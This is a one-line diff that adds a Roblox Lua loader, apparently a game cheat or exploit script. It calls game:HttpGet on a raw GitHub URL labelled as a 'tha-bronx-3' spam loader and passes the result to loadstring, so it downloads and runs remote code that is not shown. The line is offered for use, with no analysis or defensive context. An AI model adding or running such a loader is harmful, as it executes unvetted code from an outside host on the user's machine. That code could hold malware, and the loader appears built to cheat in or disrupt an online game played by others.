@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/tha-bronx-3-spam1-58m6hoonik0r5w.lua"))()
